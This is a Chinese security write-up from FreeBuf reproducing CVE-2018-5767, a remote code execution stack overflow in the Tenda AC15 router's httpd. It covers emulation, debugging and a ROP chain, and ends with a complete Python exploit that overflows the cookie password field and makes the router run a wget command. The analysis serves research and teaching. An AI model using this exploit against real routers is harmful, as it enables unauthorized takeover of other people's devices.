***本文作者：kczwa1，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。** **  
**

 **此前我们分析了四种路由器漏洞，现在终于写到 PWN 类的漏洞了。**

传送门：

> [通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃](http://www.freebuf.com/vuls/160040.html)
>
> [路由器漏洞复现分析第二弹：CNVD-2018-01084](http://www.freebuf.com/vuls/162627.html)
>
> [路由器漏洞复现分析第三弹：DVRF
> INTRO题目分析](http://www.freebuf.com/articles/wireless/163823.html)
>
>
> [路由器漏洞复现分析第四弹：CVE-2018-7034](http://www.freebuf.com/articles/wireless/165716.html)

## 1.漏洞概述  

CVE-2018-5767 TENDA AC15路由器权远程代码执行  

参考信息：<https://www.fidusinfosec.com/remote-code-execution-cve-2018-5767/>

漏洞固件版本：

Tenda cn Ac15_firmware:15.03.1.16

## 2.漏洞分析.

漏洞文件是bin/httpd

此处会将cookie中的password后面的值拷贝到变量var_1c0，造成栈溢出

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223143441669.png!small)

Arm 小端结构.

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144005626.png!small)

先把arm架构的qemu拷贝过来  

    
    
    cp $(which qemu-arm-static) ./qemu

使用如下脚本调试:

    
    
    #!/bin/bash
    
    PORT="1234"
    
    chroot ../qemu  -g $PORT  ./bin/httpd

此处会需要将connectcfm的返回值patch为1：

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223143874556.png!small)  

推荐一下keypatch 插件，可以在IDA中直接修改指令， <https://github.com/keystone-engine/keypatch>

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144198501.png!small)

之后http服务就可以运行起来了：

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144354237.png!small)

在R7WebsSecurityHandler中下好断点，

Exploit.py运行，断下来：

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144539012.png!small)  

LR 存放返回值，地址为FECDC，var_1c0是要存放可控输入变量的地方FEB1C，所以我们的palyload为A*（FECDC-FEB1C）+BBBB(需要覆盖的返回地址)+ccccdddd。跑一波，发现没有断到pc=42424242的地方，而是[R3] 出错。

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144689563.png!small)

在拷贝完password后，还会看字符串里是否含有”.”且”.”之后三位为”gif”,如果有的话就会直接跳到结尾，而不会去到需要读取[R3]的地方，在payload里面加上.gif,
pc到42424242处crash了

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144835196.png!small)

有nx，栈里的代码不能直接执行，因此必须ROP了。

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223144977107.png!small)

查找libc 基址：

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223145103410.png!small)

Libc=0x409c7000

但是此处有个坑,libc的地址并不正确,rop链会跳到错误的地方,

看一下puts函数的地址:

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223145268975.png!small)

Puts在libc中的地址:  

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223145435426.png!small)

那么libc=409dccd4-35cd4=409A7000

Libc中有system函数,那么需要找一个pop r0,sp类似的代码把sp中的参数放到r0去

ROPgadget--binary=./lib/libc.so.0 | grep"mov r0, sp"

或者 –only “pop”| grep“r0”,但是pop {r0 pc} 这条命令无法使用,因为r0的参数太长,所以需要放到pc后面,
找到如下两个godget:

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223145585494.png!small)

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223145632791.png!small)  

先将system pop到r3，再将 sp中的command参数放到r0，

构造如下exploit.py ：

    
    
    url = **"<http://%s:80/goform/exeCommand>"**%(host)        
    libc=0x409a7000  
    godget1=0x00018298 _#pop r3 pc  
    _ godget1 = struct.pack( **" < I"**,godget1+libc)  
    system=0x0005A270  
    system = struct.pack( **" < I"**, system+libc)  
    command= **"wget192.168.174.136"  
    ** godget2 = 0x00040cb8  _# mov r0 sp; blx r3  
    _ godget2 = struct.pack( **" < I"**, godget2 + libc)  
    password = **"A"** * 444+ **".gif"** +godget1+system+godget2+command  
    req = urllib2.Request(url)  
    req.add_header( **"Cookie"** , **"password=%s"** % password)  
     **try** :  
       resp = urllib2.urlopen(req)  
     **except** :  
        **pass**

 ****

在覆盖pc后，返回之前的栈的结构如下，6669672e为”.gif”,后面为布好的rop链

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223145798845.png!small)

运行完后，通过-strace参数可以看到httpd在模拟环境中执行了我们想要执行的命令：  

![CVE-2018-5767
路由器远程代码执行](https://image.3001.net/images/20180329/15223142294231.png!small)  

***本文作者：kczwa1，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

